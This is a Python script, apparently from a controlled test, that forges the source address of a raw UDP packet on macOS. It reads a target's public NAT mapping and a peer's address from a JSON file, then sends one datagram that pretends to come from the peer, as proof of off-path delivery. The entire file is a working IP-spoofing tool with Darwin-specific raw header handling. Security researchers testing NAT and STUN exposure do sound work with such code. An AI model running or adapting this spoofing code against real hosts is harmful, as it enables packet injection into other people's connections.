#!/usr/bin/env python3
"""Send exactly one forged-source UDP marker from a separate macOS runner."""
import ipaddress, json, os, socket, struct, subprocess, sys, time, pathlib

out = pathlib.Path("offpath-stun-results")
out.mkdir(parents=True, exist_ok=True)
mapping_path = out / "mapping.json"
deadline = time.time() + 240
while not mapping_path.exists() and time.time() < deadline:
    time.sleep(1)
if not mapping_path.exists():
    raise SystemExit("TIMEOUT waiting for published target mapping")

m = json.loads(mapping_path.read_text())
attacker_ip = subprocess.check_output(["curl", "-4", "-fsS", "https://api.ipify.org"], text=True).strip()
if attacker_ip in (m["client_public_ip"], m["peer_ip"]):
    raise SystemExit("FAIL: attacker, target, and peer must have distinct public IPs")

src = ipaddress.IPv4Address(m["peer_ip"]).packed
dst = ipaddress.IPv4Address(m["client_public_ip"]).packed
sport = int(m["peer_port"])
dport = int(m["client_public_port"])
payload = b"OFFPATH-DELIVERY-PROOF"
udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
total_len = 20 + len(udp)

# Darwin IP_HDRINCL expects ip_len and ip_off as host-endian fields.
header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 0x4D53, 0, 64, 17, 0, src, dst)
header = header[:2] + struct.pack("=H", total_len) + header[4:6] + struct.pack("=H", 0) + header[8:10] + struct.pack("!H", 0) + header[12:]
packet = header + udp

identity = {
    "attacker_public_ip": attacker_ip,
    "spoofed_source": f'{m["peer_ip"]}:{sport}',
    "controlled_target": f'{m["client_public_ip"]}:{dport}',
    "datagrams_sent": 1,
    "payload_hex": payload.hex(),
}
(out / "attacker-macos.json").write_text(json.dumps(identity, indent=2) + "\n")
print("ATTACK_IDENTITY=" + json.dumps(identity, sort_keys=True), flush=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
sent = sock.sendto(packet, (m["client_public_ip"], 0))
sock.close()
if sent != len(packet):
    raise SystemExit(f"FAIL: short raw send {sent}/{len(packet)}")
print(f"RAW_SEND_ACCEPTED bytes={sent}", flush=True)
